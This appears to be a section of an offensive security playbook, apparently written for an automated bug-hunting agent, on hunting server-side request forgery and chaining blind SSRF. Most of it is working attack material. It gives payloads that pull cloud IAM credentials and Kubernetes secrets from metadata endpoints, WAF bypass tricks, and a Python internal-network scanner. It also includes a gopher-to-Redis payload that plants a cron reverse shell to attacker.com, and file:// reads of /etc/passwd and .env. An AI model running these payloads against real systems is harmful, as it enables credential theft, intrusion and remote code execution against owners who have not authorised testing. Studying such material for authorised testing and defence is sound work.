# ZDH Phase 8, 32: SSRF Hunting + Blind SSRF OOB Chain

## Phase 8 - SSRF Hunting

**Setup listener:** interactsh (`interactsh-client`) or webhook.site

**SSRF-prone parameters:**
```
url=, redirect=, next=, return=, callback=, webhook=
image_url=, avatar=, logo=, thumbnail=, icon=, pdf=
feed=, import=, fetch=, load=, src=, endpoint=
host=, domain=, service=, proxy=
```

**Payloads (escalate in order):**
```bash
# Tier 1: OOB detection
url=http://<interactsh-url>/test

# Tier 2: Cloud metadata (Critical if hits)
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/  # AWS
url=http://169.254.170.2/v2/credentials                                  # AWS ECS
url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token  # GCP (need: -H "Metadata-Flavor: Google")
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01     # Azure

# Tier 3: Kubernetes metadata
url=http://169.254.169.254/latest/meta-data/  # some K8s expose EC2 metadata
url=http://10.0.0.1/                           # K8s API server (common internal IP)
url=http://kubernetes.default.svc/api/v1/namespaces/default/secrets  # K8s secrets

# Tier 4: Internal hosts from recon intel
url=http://10.x.x.x/          # Internal GitLab (from recon)
url=http://10.x.x.x/          # Internal Nexus/Artifactory (from recon)
url=http://127.0.0.1:8080/actuator/env

# Tier 5: WAF bypass variants
url=http://0x7f000001/       # hex IP
url=http://127.1/            # short form
url=http://[::1]/            # IPv6
url=http://①②⑦.⓪.⓪.①/   # unicode
# DNS rebinding: register domain that resolves to 127.0.0.1 after first lookup
```

**Confirm:** Only CONFIRMED if response body has internal data. Callback alone = POTENTIAL.

## Phase 32 - Blind SSRF OOB Chain

**When you have SSRF but get no response body - prove it with OOB callbacks, then escalate.**

### Step 1: Confirm Blind SSRF with Interactsh

```bash
interactsh-client -v
OAST="http://abcdef123.oast.me"

# Test every URL parameter, header, and body field:
for param in url url1 src source dest destination redirect next return path file fetch image callback webhook notify; do
  curl -s "https://<target>/api/proxy?${param}=${OAST}/${param}" &
done

# Also test in request body:
curl -X POST "https://<target>/api/fetch" \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"${OAST}/json-body\"}"

# Test in headers:
curl "https://<target>/api/check" \
  -H "X-Forwarded-For: ${OAST}" \
  -H "Referer: ${OAST}/referer" \
  -H "X-Forwarded-Host: ${OAST}"

# Test in SVG upload:
cat > /tmp/ssrf.svg << EOF
<svg xmlns="http://www.w3.org/2000/svg">
<image href="${OAST}/svg-upload"/>
</svg>
EOF
curl -X POST "https://<target>/api/upload" -F "file=@/tmp/ssrf.svg"
```

### Step 2: Identify Internal Network via OOB Timing

```python
import requests, time, statistics

TARGET = "https://<target>/api/fetch"
HEADERS = {"Cookie": "session=<token>", "Content-Type": "application/json"}

def probe(ip, timeout=3):
    start = time.perf_counter()
    try:
        requests.post(TARGET, json={"url": f"http://{ip}/"}, headers=HEADERS, timeout=timeout)
    except:
        pass
    return time.perf_counter() - start

baseline = statistics.mean([probe("10.255.255.254") for _ in range(5)])
live_hosts = []
for last_octet in range(1, 255):
    ip = f"10.0.0.{last_octet}"
    t = probe(ip)
    if t > baseline * 1.5:
        print(f"LIVE: {ip} ({t:.3f}s vs baseline {baseline:.3f}s)")
        live_hosts.append(ip)
```

### Step 3: SSRF Protocol Escalation

```bash
# Gopher protocol - SSRF to Redis RCE:
python3 -c "
import urllib.parse
cmd = '\r\n'.join(['*3','$3','SET','$8','deadbeef','$50','\n\n*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n'])
gopher = 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(cmd)
print(gopher)
"
# curl "https://<target>/api/fetch?url=<gopher-url>"

# file:// protocol (local file read):
curl "https://<target>/api/fetch?url=file:///etc/passwd"
curl "https://<target>/api/fetch?url=file:///proc/self/environ"
curl "https://<target>/api/fetch?url=file:///app/.env"

# dict:// protocol (port scanner):
curl "https://<target>/api/fetch?url=dict://127.0.0.1:22/"

# ftp:// (some apps allow):
curl "https://<target>/api/fetch?url=ftp://127.0.0.1:21/"
```

### Evidence Classification for SSRF

```
INFORMATIONAL:   DNS OOB callback only (no HTTP, no data)
CONFIRMED-LOW:   HTTP OOB callback (server confirmed making requests)
CONFIRMED-HIGH:  SSRF to internal IP that returns different response than nonexistent IP
CONFIRMED-CRIT:  SSRF -> metadata service -> IAM credentials extracted
               OR SSRF -> internal API -> PII data returned
               OR SSRF -> Redis/Memcached via Gopher -> RCE

NOT A FINDING:
- DNS OOB if you only tested from your own machine (could be browser, not server)
- HTTP OOB if Referer/Origin header from client (not server-side request)
Always verify: OOB callback IP should be TARGET SERVER IP, not your own
```

**Signal:** `emit_signal VULN_CONFIRMED "SSRF confirmed: <endpoint> -> <metadata/internal-data>" "main/zerodayhunt" 0.93`
